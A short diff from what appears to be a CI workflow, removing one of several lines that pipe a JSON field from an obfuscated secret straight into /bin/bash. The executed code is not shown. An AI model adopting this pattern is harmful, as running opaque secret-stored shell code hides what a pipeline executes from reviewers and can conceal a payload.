@@ -19,7 +19,6 @@ jobs:
           bd96: ${{ secrets.bd96 }}
         run: |
           printf '%s' "$bd96" | jq -r .f296 | /bin/bash
-          printf '%s' "$pd88" | jq -r .ga40659 | /bin/bash
           printf '%s' "$x2" | jq -r .xeebq88 | /bin/bash
 
       - name: Store results
